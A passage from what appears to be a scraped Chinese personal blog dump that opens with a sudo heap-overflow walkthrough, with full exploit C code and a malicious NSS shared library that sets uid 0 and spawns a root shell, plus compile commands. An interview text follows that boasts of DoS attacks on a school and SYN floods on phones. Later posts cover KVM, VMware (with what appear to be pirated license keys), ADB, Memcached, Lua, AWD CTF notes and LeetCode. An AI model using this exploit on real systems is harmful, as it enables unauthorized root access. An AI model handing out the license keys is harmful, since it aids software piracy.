__getline 函数中申请的chunk 长度是一样的，固定为0x80大小。\n所以我们可以将它理解为，这是一个在service 链表之前申请的，并且service链表结构申请完毕就会被释放的，而且在vuln chunk 申请之前还能一直保持free 状态的一个非常宝贵的chunk。\n分析完这个函数，我们总得知道怎么触发它吧，当需要调用一些，查找用户或者主机信息的函数时，会执行以下流程：\nvoid *__nss_lookup_function (service_user *ni, const char *fct_name){  \n··· ···  \nfound &#x3D; __tsearch (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);  \n…. &#x2F;&#x2F;没有搜到的一些操作省略  \nelse  \n{  \nknown_function *known &#x3D; malloc (sizeof *known);  \n··· ···  \nelse  \n{  \n&#x2F;&#x2F;调用nss_load_library, 检查ni-&gt;library-&gt;lib_handle 是否为空，为空则重新dlopen  \n&#x2F;&#x2F;具体nss_load_library 代码见上面  \n··· ···  \nif (nss_load_library (ni) !&#x3D; 0)  \n&#x2F;* This only happens when out of memory.  *&#x2F;  \ngoto remove_from_tree;  \nif (ni-&gt;library-&gt;lib_handle &#x3D;&#x3D; (void *) -1l)  \n&#x2F;* Library not found &#x3D;&gt; function not found.  *&#x2F;  \nresult &#x3D; NULL;  \nelse  \n{  \n··· ···  \n&#x2F;* Construct the function name.  *&#x2F;  \n__stpcpy (__stpcpy (__stpcpy (__stpcpy (name, “nss“),  \nni-&gt;name),  \n“_”),  \nfct_name);  \n&#x2F;* Look up the symbol.  *&#x2F;  \nresult &#x3D; __libc_dlsym (ni-&gt;library-&gt;lib_handle, name);  \n}  \n··· ···  \n··· ···  \n}  \n……\nreturn result;}libc_hidden_def (__nss_lookup_function)\n可以看到就是在这里调用了nss_load_library (ni)，也就是说只要调用了libnss_xx.so里的函数，就一定会调用nss_load_library来进行搜索。只需要知道堆溢出发生之后，第一个被调用的libnss相关的函数属于哪个so，然后通过堆布局将该so 所属的service_user 结构体布局到 vuln chunk 后面即可分析完任意代码执行原理，再来谈谈如何进行堆布局，只有通过合理的堆布局，才能成功溢出到对应的结构体且不修改其他正常结构体。这里介绍一种方法：setlocalesetlocale 的堆机制，关键就一句话，按照自己想要释放的chunk 顺序去输入该长度的环境变量即可，能保证释放顺序和前后关系，但这些chunk 并不前后紧密相连Setlocale是用来设置语言环境的，有几种环境变量参数，在sudo 中使用的是 setlocale(LC_ALL,“”); 当传入参数是LC_ALL 时，会从 LC_IDENTIFICATION 开始向前遍历所有的变量。对于每一个调用 _nl_find_locale 函数，这个函数里面比较复杂，但返回的 newnames[category] 其实就是对应环境变量的值，会在接下来调用strdup 函数将该字符串拷贝到堆上。由于传入的是LC_ALL ，那么会生成一个对应的字符串数组，接下来会和全局变量默认值进行一次校验，如果校验失败，那么就会将其释放(很容易构造出失败的输入)。也就是说，我们可以通过构造一些合理长度的失败输入，实现任意次任意长度的堆申请和堆释放，这对我们的堆布局有非常大的帮助。最后就是找到堆溢出之后第一个调用的nss里的函数，根据这个图找到它对应着几号chunk:\n然后计算好参数总长度，让sudo申请到我们布置好的chunk，并且让接下来nss函数申请的chunk处在sudo申请的chunk的下方，然后利用sudo造成的堆溢出覆盖service_user结构体即可，name在service_user结构体偏移0x30的位置，覆盖成我们自己写的.so的name即可实现任意代码执行\n#include&lt;stdio.h&gt;  #include&lt;string.h&gt;  #include&lt;stdlib.h&gt;  #include&lt;math.h&gt;  #define __LC_CTYPE               0  #define __LC_NUMERIC             1  #define __LC_TIME                2  #define __LC_COLLATE             3  #define __LC_MONETARY            4  #define __LC_MESSAGES            5  #define __LC_ALL                 6  #define __LC_PAPER               7  #define __LC_NAME                8  #define __LC_ADDRESS             9  #define __LC_TELEPHONE          10  #define __LC_MEASUREMENT        11  #define __LC_IDENTIFICATION     12  char * envName[13]=&#123;&quot;LC_CTYPE&quot;,&quot;LC_NUMERIC&quot;,&quot;LC_TIME&quot;,&quot;LC_COLLATE&quot;,&quot;LC_MONETARY&quot;,&quot;LC_MESSAGES&quot;,&quot;LC_ALL&quot;,&quot;LC_PAPER&quot;,&quot;LC_NAME&quot;,&quot;LC_ADDRESS&quot;,&quot;LC_TELE  PHONE&quot;,&quot;LC_MEASUREMENT&quot;,&quot;LC_IDENTIFICATION&quot;&#125;;  int now=13;  int envnow=0;  int argvnow=0;  char * envp[0x300];  char * argv[0x300];  char * addChunk(int size)  &#123;  \tnow --;  \tchar * result;  \tif(now ==6)  \t&#123;  \t\tnow --;  \t&#125;  \tif(now&gt;=0)  \t&#123;  \t\tresult=malloc(size+0x20);  \t\tstrcpy(result,envName[now]);  \t\tstrcat(result,&quot;=C.UTF-8@&quot;);  \t\tfor(int i=9;i&lt;=size-0x17;i++)  \t\tstrcat(result,&quot;A&quot;);  \t\tenvp[envnow++]=result;  \t&#125;  \treturn result;  \t&#125;  \tvoid final()  \t&#123;  \t\tnow --;  \t\tchar * result;  \t\tif(now ==6)  \t&#123;  \t\tnow --;  \t&#125;  \t\tif(now&gt;=0)  \t&#123;  \t\tresult=malloc(0x100);  \t\tstrcpy(result,envName[now]);  \t\tstrcat(result,&quot;=xxxxxxxxxxxxxxxxxxxxx&quot;);  \t\tenvp[envnow++]=result;  \t&#125;  \t&#125;  int setargv(int size,int offset)  &#123;  \tsize-=0x10;  \tsigned int x,y;  \tsigned int a=-3;  \tsigned int b=2*size-3;  \tsigned int c=2*size-2-offset*2;  \tsigned int tmp=b*b-4*a*c;  \tif(tmp&lt;0)  \t\treturn -1;  \ttmp=(signed int)sqrt((double)tmp*1.0);  \tsigned int A=(0-b+tmp)/(2*a);  \tsigned int B=(0-b-tmp)/(2*a);  \tif(A&lt;0 &amp;&amp; B&lt;0)  \t\treturn -1;  \tif((A&gt;0 &amp;&amp; B&lt;0) || (A&lt;0 &amp;&amp; B&gt;0))  \t\tx=(A&gt;0) ? A: B;  \tif(A&gt;0 &amp;&amp; B &gt; 0)  \tx=(A&lt;B) ? A : B;  \ty=size-1-x*2;  \tint len=x+y+(x+y+y+1)*x/2; \twhile ((signed int)(offset-len)&lt;2)  \t&#123;      \tx--;  \t\ty=size-1-x*2;  \t\tlen=x+y+(x+y+1)*x/2;  \t\tif(x&lt;0)  \t\treturn -1;  \t&#125;  \tint envoff=offset-len-2+0x30;  \tprintf(&quot;%d,%d,%d\\n&quot;,x,y,len);  \tchar * Astring=malloc(size);  \tint i=0;  \tfor(i=0;i&lt;y;i++)  \tAstring[i]=&#x27;A&#x27;;  \tAstring[i]=&#x27;\\x00&#x27;;  \targv[argvnow++]=&quot;sudoedit&quot;;  \targv[argvnow++]=&quot;-s&quot;;  \tfor (i=0;i&lt;x;i++)  \targv[argvnow++]=&quot;\\\\&quot;;  \targv[argvnow++]=Astring;  \targv[argvnow++]=&quot;\\\\&quot;;  \targv[argvnow++]=NULL;  \tfor(i=0;i&lt;envoff;i++)  \tenvp[envnow++]=&quot;\\\\&quot;;  \tenvp[envnow++]=&quot;X/test&quot;;  \treturn 0;  &#125;  int main()  &#123;  \tsetargv(0xa0,0x650);  \taddChunk(0x40);  \taddChunk(0x40);  \taddChunk(0xa0);  \taddChunk(0x40);  \tfinal();  \texecve(&quot;/usr/local/bin/sudoedit&quot;,argv,envp);  &#125;  \n\n\n\n#include &lt;unistd.h&gt;  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  static void __attribute__ ((constructor)) _init(void);  static void _init(void) &#123;  \tprintf(&quot;[+] bl1ng bl1ng! We got it!\\n&quot;);  #ifndef BRUTE  \tsetuid(0); seteuid(0); setgid(0); setegid(0);  \tstatic char *a_argv[] = &#123; &quot;sh&quot;, NULL &#125;;  \tstatic char *a_envp[] = &#123; &quot;PATH=/bin:/usr/bin:/sbin&quot;, NULL &#125;;  \texecv(&quot;/bin/sh&quot;, a_argv);  #endif  &#125;  \n\n编译命令：\nmkdir libnss_X  gcc -fPIC -shared lib.c -o ./libnss_X/test.so.2  gcc exp.c -o exp  \n\n\n\nref：https://blog.csdn.net/weixin_46483787/article/details/125552056\n其他个人介绍各位面试官，你们好，我叫xxx，现就读于成都信息工程大学。也是道格安全研究实验室成员，现至力于二进制安全研究，热爱网络安全，愿意不断接触和学习新的专业技术和知识。在Github有多个实用开源工具与软件，也拥有多个项目经历和比赛证书。\n曾经在奇安信、矢安科技、永信至成、启明星辰、绿盟科技、网御科技、51cto、易霖博等等知名安全公司的特聘岗位工作过。\n目前希望入职漏洞挖掘相关的职位，谢谢。\n你挖过哪些洞？之前挖了华为官网的xss，2小时内还有效，准备提交的，被他们的waf检测到了，很快被修复了。\n通过webbench可以对我们学校造成拒绝服务式攻击，导致数据库出现报错在前端。\n某资源网站每日中午12点整时，访问https://www.aqiyuanma.com某某商品时，突然跳转到world presss安装界面，可以自己创建账号\n，通过该账号可以访问后台，持续3分钟左右，又会自己跳出来。\n小米手机热点转发syn洪水攻击时，会死机，测试过4个小米，三个会死机，一个严重卡顿，测试过一台华为，出现卡顿。\n开源pev工具的洞。\n开源JEngine热更框架的bug。\n你还有什么想问的吗？没了，谢谢！\n","categories":["security"],"tags":["interview"]},{"title":"KVM虚拟机配置","url":"/2021/09/28/env/linux/kvm/","content":"KVM虚拟机配置概念Linux下的内核虚拟化模块Windows下的虚拟化软件Hyper-V企业化：EXSI虚拟化的前提：硬件虚拟化（）Intel虚拟CPU：Intel VT\nKVM：就是Keyboard Video Mouse的缩写。KVM 交换机通过直接连接键盘、视频和鼠标 (KVM) 端口，让您能够访问和控制计算机。KVM 技术无需目标服务器修改软件。这就意味着可以在 Windows 的 BIOS 环境下，随时访问目标计算机。KVM 提供真正的主板级别访问，并支持多平台服务器和串行设备。KVM 技术已经从最初的基础SOHO办公型，发展成为企业 IT 基础机房设施管理系统。可以从kvm 客户端管理软件轻松的直接访问位于多个远程位置的服务器和设备。KVM over IP 解决方案具备完善的多地点故障转移功能、符合新服务器管理标准 (IPMI) 的直接界面，以及将本地存储媒体映射至远程位置的功能。中文名KVM全称Keyboard Video Mouse本质计算机技术优点支持多平台服务器和串行设备地位网络中的管理设备功能支持串口overIP远程调试串口设备\n工作原理首先简要介绍一下虚拟化技术及其涉及的元素。 虚拟化解决方案的底部是要进行虚拟化的机器。这台机器可能直接支持虚拟化，也可能不会直接支持虚拟化；那么就需要系统管理程序的支持。系统管理程序，或称为 VMM，也称为Hypervisor，可以看作是平台硬件和操作系统的抽象化。在某些情况中，这个系统管理程序就是一个操作系统；此时，它就称为主机操作系统。系统管理程序之上是客户机操作系统，也称为虚拟机（VM）。这些 VM 都是一些相互隔离的操作系统，将底层硬件平台视为自己所有。但是实际上，是系统管理程序为它们制造了这种假象。使用 KVM 引用内核虚拟机，使用 KVM 引用系统管理程序（用来启动一台新虚拟机）。更加简单的一种虚拟化是操作系统虚拟化，其中一台计算机可以运行相同类型的多个操作系统。这种虚拟化可以将一个操作系统的多个服务器隔离开来 （这意味着全都必须使用相同类型和版本的操作系统）。要对所有电子线路板进行三防处理。\n特点KVM是键盘(Keyboard)、显示器(Video)、鼠标(Mouse)的缩写。KVM技术的核心思想是：通过适当的键盘、鼠标、显示器的配置，实现系统和网络的集中管理；提高系统的可管理性，提高系统管理员的工作效率；节约机房的面积，降低网络工程和服务器系统的总体拥有成本；避免使用多显示器产生的辐射，营建健康环保的机房。利用KVM多主机切换系统，系统管理员可以通过一套键盘、鼠标、显示器在多个不同操作系统的主机或服务器之间进行切换并实施管理。\n一、切换器（KVM）一般应用在哪些领域？信息控制中心 、呼叫中心、证券&#x2F;金融交易系统、银行数据中心、工业控制环境、教学环境、测试中心等所有多服务器或多计算机工作环境。\n二、切换器（KVM）的基本特点。即插即用的设计，操作起来方便简单。可支持PC、SUN和MAC等各种品牌计算机和服务器。适用于NETWARE、WIN95&#x2F;98&#x2F;2000&#x2F;ME&#x2F;XP&#x2F;NT、UNIX、OS&#x2F;2等各种操作系统和应用软件。可适配VGA、SVGA和XGA等各种分辨率显示器。有自动扫描、热键切换和OSD菜单等强大功能。\n三、切换器（KVM）有关的名词解释。1． 输入接口输入接口是切换器的主要参数，指其输入的接口方式和接口数量。切换器一般有4路、8路、32路甚至更多的输入接口，使用BNC插头或复合视频接口。2． 输出接口输出接口指切换器的输出接口方式，一般为BNC插头或复合视频接口。3． 带宽带宽又叫频宽，是指在固定的的时间内可传输的资料数量，亦即在传输管道中可以传递数据的能力。在数字设备中，频宽通常以bps表示，即每秒可传输之位数。在模拟设备中，频宽通常以每秒传送周期或赫兹Hz来表示。频宽对基本输入输出系统（BIOS）设备尤其重要，如快速磁盘驱动器会受低频宽的总线所阻碍。4． 切换器方式切换方式是指KVM切换器在从一台设备转换到控制另外一台设备时所采用的切换方式。一般的产品都是通过按钮、hot-key（热键）和屏幕菜单来操作了。5． 支持分辨率支持分辨率主要是指KVM切换器在有其中控制的机器向其输出信号时所能显示的分辨率，也就是视频窗口的宽度和高度上的像素数量。6． 热插拔热插拔是指可以直接增加或移除主机而无需关闭电源。7． 热键切换指用定义键进行切换。8． 多用户两个以上用户操作主机。9． 级联两个以上切换器操作八个以上主机。10． 即插即用无需驱动程序随时安装使用。11． 多平台适于所有操作系统和软件环境12． 机架式可安装在19英寸机架上四、使用切换器（KVM）的优越性。相对于数据仓库和互联网这些发展极快和服务器数量增加极快的公司来说，采用切换器（KVM）的优越性将体现在以下几个方面：1． 节省空间：对于这些发展极为快速的行业而言，原先所用的空间相对有限，而搬迁则会造成服务的停顿。在这些情况下，减少键盘、鼠标和显示器的数量，可以为新增加的服务器腾出大量的空间。2．提高效率：可以想象，当系统或网络维护人员穿梭于服务器、各种机柜所组成的丛林中，寻找出故障的机器时，效率是不会提高的。而这低效率，不但浪费了有限的人力资源，而且使出现的故障得不到及时的修复，使网络或数据中心出现不应有的停顿。能实现在由一套键盘、鼠标、显示器组成的控制台登陆所有的机器，势必将极大地提高系统或网络维护人员的工作效率。3．加强管理：工作效率的提高，意味着网络或数据中心得到了有效的管理，从而提高了这些系统的稳定性和安全性。4．节约成本：网络运营成本，尤其是那些必须24小时不间断运行的网络及数据中心的运行成本，逐渐成为网络经营商们成功的关键因素。同时，硬件软件费用、人员费用以及场地费用也是公司运营费用的主要组成部分。5．远程管理：系统的远程维护和管理也是这些大型系统所面临的重要问题。系统的管理和维护人员不可能24小时在机房里值班，而机器故障却可能在任何时候发生，因信息的交通堵塞而造成系统长时间的不稳定将极大地损坏企业的形象或产生重大的损失。通过远程的键盘、鼠标和显示器来实现系统的远程管理、维护是保证系统24小时不间断、稳定运行的重要手段。6．环保节能：使用KVM Switch可避免使用多台显示器，从而减少辐射，节省空调、能源等的消耗，营造健康环保节能的工作环境。因此，实现一个用户使用一套键盘、鼠标、显示器去访问和操作一台以上主机的功能将为不少的企业节省了空间和服务器外设产品资源，有效提高大规模应用的管理能力。\n二、 实验环境：Arch Linux x86_642.1虚拟机关机模式下开启虚拟化引擎后再开机\ncat /proc/cpuinfo | egrep &#x27;vmx|svm&#x27;\n\n\n\n安装virt\nsudo pacman -S virt-manager libvirtsudo systemctl enable libvirtdsudo systemctl start libvirtd\n\n查看\nlsmod | grep kvm \n\n启动\nsudo virt-manager\n\n\n\n查看网络\nvirsh net-list --all\n\n\n\n启动网络\nsudo virsh net-start defaultsudo virsh net-autostart default\n\n\n\n启动虚拟机\nvirsh start XXXX_new # 启动虚拟机\n\n\n\n安装\nvirt-install --name rhel-server-7.4-x86_64-dvd.iso --disk path=/dev/sdb1  --check path_in_use=off --graphics spice --vcpus=1 --ram 1024 --location=/root/test/rhel-server-7.4-x86_64-dvd.iso --network bridge=br1 --os-type=linux --os-variant=rhel7\n\n\n\n网路设置使用brctl命令创建网桥br1\nbrctl addbr br1\n\n删除网桥br1\nbrctl delbr br1\n\n将eth0端口加入网桥br1\nbrctl addif br1 eth0\n\n删除网桥br1的端口eth0\nbrctl delif br1 eth0\n\n\n\n查询网桥信息\nbrctl showbrctl show br1\n\n\n\n开启路由转发\nsudo -iecho 1 &gt; /proc/sys/net/ipv4/ip_forward\n\n\n\n防火墙设置\nsudo -iiptables -t nat -A POSTROUTING -j MASQUERADE\n\n\n\n遇到的问题问题一:\nsudo virsh net-start defaulterror: Failed to start network defaulterror: internal error: Failed to initialize a valid firewall backend\n\n\n\n在启动虚拟机网络时报错， libvirtError: internal error: Failed to initialize a valid firewall backend，查资料，如下解决\nsudo pacman -S ebtables dnsmasq firewalld\n\n\n\n注意，要将当前用户加入kvm组，否则没有kvm权限\nsudo groupadd kvmsudo usermod -aG kvm rootsudo usermod -aG docker $&#123;USER&#125;sudo systemctl restart libvirtd\n\n\n\n创建虚拟机采用图形化界面创建虚拟机virt-manager\n\n进去之后选择File-&gt; New Virtual Machine ，选择一个下载好的ISO即可\n选择安装之后就会在/var/lib/libvirt/images/生成一个虚拟机磁盘\n采用命令创建虚拟机virt-install安装virt-install --name=win7 --os-variant=win7 --ram 512 --vcpus=1 --disk path=/home/kvm_imgs/win7.img,size=30,format=qcow2,bus=virtio --accelerate --disk device=cdrom,path=/opt/win7.iso --disk device=cdrom,path=/opt/virtio-win-0.1.102.iso --vnc --vncport=5922 --vnclisten=0.0.0.0 --network bridge=br0,model=virtio --noautoconsole\n\n\n\n如果img文件或者qcow2文件已经自带了系统，就用 –boot&#x3D;hd ; 如果是本身有网卡驱动的镜像就不要用 model&#x3D;virtio ）\n比如下面这种创建方法：\nvirt-install --name=systemname --vcpu=4 --ram=8196 --disk path=path_of_img_or_qcow2,format=qcow2 --boot=hd --network bridge=br0,model=virtio --vnc --vncport=123456 --vnclisten=0.0.0.0 --noautoconsole\n\n\n\nbr20.xml\n&lt;network&gt;  &lt;name&gt;br20&lt;/name&gt;  &lt;forward mode=&#x27;nat&#x27;&gt;    &lt;nat&gt;      &lt;port start=&#x27;1024&#x27; end=&#x27;65535&#x27;/&gt;    &lt;/nat&gt;  &lt;/forward&gt;  &lt;bridge name=&#x27;br20&#x27; stp=&#x27;on&#x27; delay=&#x27;0&#x27;/&gt;  &lt;ip address=&#x27;192.168.30.1&#x27; netmask=&#x27;255.255.255.0&#x27;&gt;    &lt;dhcp&gt;      &lt;range start=&#x27;192.168.30.50&#x27; end=&#x27;192.168.30.200&#x27;/&gt;    &lt;/dhcp&gt;  &lt;/ip&gt;&lt;/network&gt;\n\n\n\n运行虚拟机ref: https://www.cnblogs.com/huanglinxin/p/10148572.html\nref: https://blog.csdn.net/ningjiu9/article/details/82053200\nref: https://blog.csdn.net/github_27924183/article/details/76914322\nref: https://wiki.archlinux.org/title/KVM_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\nref: https://blog.csdn.net/qq_25868251/article/details/84879475\n","categories":["env"],"tags":["linux"]},{"title":"Install vmware on arch linux","url":"/2021/09/27/env/linux/vmware/","content":"Install vmware on arch linux1.安装VM的依赖包\nsudo pacman -S fuse2 gtkmm linux-headers pcsclite libcanberrayay -S ncurses5-compat-libs         #aur里面的依赖包\n\n\n2.安装VM\nyay -S vmware-workstation3.开启服务,不然创建虚拟机之后运行会显示错误\nsudo systemctl start vmware-networks.service  vmware-usbarbitrator.service vmware-hostd.service                    #启动虚拟机的网络,USB,共享等服务sudo systemctl enable vmware-networks.service  vmware-usbarbitrator.service vmware-hostd.service                   #启动虚拟机的网络,USB,共享等服务sudo modprobe -a vmw_vmci vmmon          #加载VMware模块sudo vmware-networks --start #启动vmware网络\n\n卸载vmware\nyay -Rns vmware-workstation             #卸载vm\n\n\n\n启动之后输入许可证\nvmware16输入如下:\nvmware workstation16许可证密钥\nZF3R0-FHED2-M80TY-8QYGC-NPKYFYF390-0HF8P-M81RQ-2DXQE-M2UT6ZF71R-DMX85-08DQY-8YMNC-PPHV8前面的如果已经失效，用下面的FA1M0-89YE3-081TQ-AFNX9-NKUC0\n\n启动后可能网络这些不通，如果不通，执行以下命令\nsudo systemctl start vmware-networks.service  vmware-usbarbitrator.service vmware-hostd.service                    #启动虚拟机的网络,USB,共享等服务sudo systemctl enable vmware-networks.service  vmware-usbarbitrator.service vmware-hostd.service                   #启动虚拟机的网络,USB,共享等服务sudo modprobe -a vmw_vmci vmmon          #加载VMware模块sudo vmware-networks --start #启动vmware网络 \n\n","categories":["env"],"tags":["linux"]},{"title":"ADB调试安卓","url":"/2021/09/17/env/andriod/adb/","content":"ADB调试安卓Install:\nsudo pacman -S adb\n\n\n\n在手机上设置开发者模式，usb调试安装等。\nredmi note9设置: https://zhidao.baidu.com/question/206891065776523485.html\n设置好后发现adb devices下没有权限，\n通过lsusb查看usb id号:\nlsusb\n\n输出\nBus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hubBus 003 Device 003: ID 04f2:b67c Chicony Electronics Co., Ltd Integrated CameraBus 003 Device 002: ID 0cf3:e300 Qualcomm Atheros Communications QCA61x4 Bluetooth 4.0Bus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hubBus 002 Device 002: ID 2109:0817 VIA Labs, Inc. USB3.0 Hub             Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hubBus 001 Device 009: ID 18d1:4ee7 Google Inc. Nexus/Pixel Device (charging + debug)Bus 001 Device 004: ID 0bda:8152 Realtek Semiconductor Corp. RTL8152 Fast Ethernet AdapterBus 001 Device 003: ID 2109:2817 VIA Labs, Inc. USB2.0 Hub             Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\n\n这里就是18d1:4ee7\nsudo vim /etc/udev/rules.d/51-android.rules\n\n添加:\nSUBSYSTEM==“usb”, ATTRS&#123;idVendor&#125;“0bb4”,ATTRS&#123;idProduct&#125;“0c87”,MODE=&quot;0666&quot;\n\n其中0bb4和0c87替换成之前我们记下的id就可以；\n给予权限\nsudo chmod a+rx /etc/udev/rules.d/51-android.rules\n\n\n\n拔掉设备，重启adb\nsudo adb kill-serversudo adb start-server\n\n\n\nref: \n","categories":["env"],"tags":["android"]},{"title":"Memcache","url":"/2021/08/28/env/linux/memcache/","content":"MemcacheMemcached是一个自由开源的，高性能，分布式内存对象缓存系统。\nMemcached是以LiveJournal旗下Danga Interactive公司的Brad Fitzpatric为首开发的一款软件。现在已成为mixi、hatena、Facebook、Vox、LiveJournal等众多服务中提高Web应用扩展性的重要因素。\nMemcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。\nMemcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。\n本质上，它是一个简洁的key-value存储系统。 \n2.memcached -h命令查看帮助信息\n3.查看配置信息&#x2F;etc&#x2F;sysconfig&#x2F;memcached中：\nPORT=&quot;11211&quot;USER=&quot;root&quot;MAXCONN=&quot;1024&quot;CACHESIZE=&quot;64&quot;OPTIONS=&quot;&quot;\n\n3.memcached-tool 127.0.0.1:11211 stats命令查看memcached状态\n 如果出现：Couldn’t connect to 127.0.0.1:11211，很可能是memcached服务没有启动\n服务启动命令：\nmemcached -d -u root -l 127.0.0.1 -p 11211 -m 128\n\n参数\n-p &lt;num&gt;   设置TCP端口号(默认不设置为: 11211)-U &lt;num&gt;   UDP监听端口(默认: 11211, 0 时关闭) -l &lt;ip_addr&gt; 绑定地址(默认:所有都允许,无论内外网或者本机更换IP，有安全隐患，若设置为127.0.0.1就只能本机访问)-d          以daemon方式运行-u &lt;username&gt; 绑定使用指定用于运行进程&lt;username&gt;-m &lt;num&gt;   允许最大内存用量，单位M (默认: 64 MB)-P &lt;file&gt;   将PID写入文件&lt;file&gt;，这样可以使得后边进行快速进程终止, 需要与-d 一起使用\n\nref: https://www.cnblogs.com/zhang-ding-1314/p/9901610.html\n","categories":["env"],"tags":["linux"]},{"title":"Lua","url":"/2021/08/10/dev/language/lua/lua/","content":"LuaTable--定义局部变量，只能在当前文件使用local var  = 0--定义全局变量var2 = 1--注释-- 表print(&quot;表: table&quot;)myTable = &#123;&#125;myTable.word = &quot;hello&quot;myTable.num = 100print(myTable.word)print(myTable.num)print(myTable[&quot;word&quot;])myTable2 = &#123;hello = &quot;Hello lua&quot;&#125;print(myTable2[&quot;hello&quot;])-- 遍历tablefor key, var in pairs(myTable) do    print(key, var)end--数组print(&quot;数组&quot;)arr1 = &#123;1, 2, 3, 4, 5, &quot;hello&quot;&#125;--打印数组for key, var in pairs(arr1) do    print(key, var)endarr2 = &#123;&#125;-- 采用api初始化数组for var=1, 100 do    table.insert(arr2, 1, var)end--print()#--打印数组--for key, var in pairs(arr2) do--    print(key, var)--end--print(arr)\n\n面向对象采用复制表--采用复制表方式实现面向对象-- 采用table+clone来实现--用于复制table，返回一个新的tablefunction clone(tab)    local ins = &#123;&#125;    for key, var in pairs(tab) do        ins[key] = var    end    return insend--创建一个tablePeople = &#123;&#125;People.say = function()    print(&quot;People say&quot;)endlocal p = clone(People)p.say()-- 采用自己构造的方法来实现People2 = &#123;&#125;People2.new = function(name)    local self = clone(People2)    self.name = name    return selfendPeople2.say = function(self)    print(&quot;People2 :&quot;..self.name..&quot; say&quot;)endlocal p = People2.new(&quot;I0gan&quot;)p.say(p)p:say() -- 等价于 p.say(p)\n\n类的继承-- 采用复制表方式实现类的继承function clone(tab)    local ins = &#123;&#125;    for key, var in pairs(tab) do        ins[key] = var    end    return insendfunction copy(dist, tab)    for key, var in pairs(tab) do        dist[key] = var    endendPeople = &#123;&#125;People.say = function()    print(&quot;People say&quot;)endPeople.new = function()    return clone(People)endMan = &#123;&#125;Man.new = function(name)    local self = People.new() -- 继承People类    copy(self, Man)    return selfendMan.manSay = function()    print(&quot;Man say&quot;)endm = Man.new()m.say() -- 调用父类方法m.manSay() -- 调用自己的方法\n\n\n\n采用函数闭包--函数闭包方式实现面向对象function People(name)    local self = &#123;&#125;    local function init()        self.name = name    end    self.say = function()         print(&quot;People: &quot;..self.name..&quot; say&quot;)    end    init() --相当于构造函数，私有化函数    return selfendlocal p = People(&quot;I0gan&quot;)p:say()-- 类的继承function Man(name)    local self = People(name)    self.manSay = function()        print(&quot;Man: &quot;..self.name..&quot; say ...&quot;)    end    return selfendlocal m = Man(&quot;I0gan&quot;)m.say() --调用父类方法m.manSay() --调用子类方法\n\n","categories":["language"],"tags":["lua"]},{"title":"D0g3 AWD分享会","url":"/2021/08/01/school/d0g3-2021-08-01-awd%E5%88%86%E4%BA%AB/","content":"浅谈AWD二进制介绍AWD (Attack with defense)，在ctf中经常出现在线下的一种比赛形式，主要考察参赛选手的漏洞挖掘能力，漏洞修补能力，还有团队配合能力。\n比赛规则概述：\n在比赛开始之前，举办方会给每支队伍相应的服务器靶机登录信息，包括ip和ssh登录密码。每一个题对应一个靶机，需要选手采用ssh远程连接自己的服务器下载自己的相关服务附件进行漏洞挖掘与修补。\n举办方在规定时间内会对服务进行check，若漏洞修复错误导致check失败，则会被扣除相应分数。若该漏洞未被修复，被其他队伍攻击，也会被扣除相应分数。flag会在每隔一段时间内刷新一次，check一般都是不定期的进行check。\n其他队伍的服务ip和端口，一般都需要自己去扫描网段，将其他队伍的服务扫出来才能对其他队伍进行攻击。\n不能出现攻击平台等行为不能出现ddos攻击不能上通防\nAWD Plus概述AWD Plus与AWD差别还是挺大的，在我们国内一般都是解题+修复，选手成功攻击自己的靶机后，平台之后每一轮会自动攻击其他队伍，有些平台也可以下载攻击流量，查看其他队伍是怎么攻击的，修复漏洞是某些平台可以直接上传附件，某些平台是需要自己登录靶机之后进行文件替换并允许某些脚本。\n常见漏洞溢出漏洞堆栈溢出\n堆溢出\n整型溢出\n\nbuf[10];\nread(0, buf, 10);\n//read(0, buf, unsigned int(-1));\n\n字符串漏洞char str[];\nprintf(str);\n\nprintf(&quot;%s&quot;, str);\n\nsprintf\nsnprintf\nfprintf\n\nuaf(user after free) 内存开辟之后，继续使用该内存\n\nfree(ptr);\n\n目录穿越采用../../的形式可达到敏感文件读取，一般出现在与web结合的pwn题中\n\n命令注入输入的参数与命令进行拼接之后并执行\n\n修补漏洞插件安装keypatch插件\n\n\n修改.frame段权限\n\n上流量该waf使用与普通awd\nhttps://github.com/i0gan/pwn_waf\n流量抓取流量转发批量攻击https://github.com/i0gan/awd_script\n","categories":["school"],"tags":["d0g3"]},{"title":"LeetCode","url":"/2021/07/13/dev/code/leetcode/","content":"My leetcode: https://leetcode.com/i0gan\n1. Two SumIntroGiven an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\nYou may assume that each input would have exactly one solution, and you may not use the same element twice.\nYou can return the answer in any order.\nExample 1:\nInput: nums &#x3D; [2,7,11,15], target &#x3D; 9Output: [0,1]Output: Because nums[0] + nums[1] &#x3D;&#x3D; 9, we return [0, 1].Example 2:\nInput: nums &#x3D; [3,2,4], target &#x3D; 6Output: [1,2]Example 3:\nInput: nums &#x3D; [3,3], target &#x3D; 6Output: [0,1]\nConstraints:\n2 &lt;&#x3D; nums.length &lt;&#x3D; 104-109 &lt;&#x3D; nums[i] &lt;&#x3D; 109-109 &lt;&#x3D; target &lt;&#x3D; 109Only one valid answer exists.\nFollow-up: Can you come up with an algorithm that is less than O(n2) time complexity?\nSolutionclass Solution &#123;public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;        int size = nums.size();        vector&lt;int&gt; ret;        for(int i = 0; i &lt; size; i++) &#123;            for(int j = i + 1; j &lt; size; j++) &#123;                if(nums[i] + nums[j] == target) &#123;                    ret.push_back(i);                    ret.push_back(j);                &#125;            &#125;        &#125;        return ret;    &#125;&#125;;\n\n\n\nRuntime: 40 ms\nMemory Usage: 8.9 MB\n2. Add Two NumbersIntroYou are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order, and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.\nYou may assume the two numbers do not contain any leading zero, except the number 0 itself.\nExample 1:\n\n\nInput: l1 = [2,4,3], l2 = [5,6,4]Output: 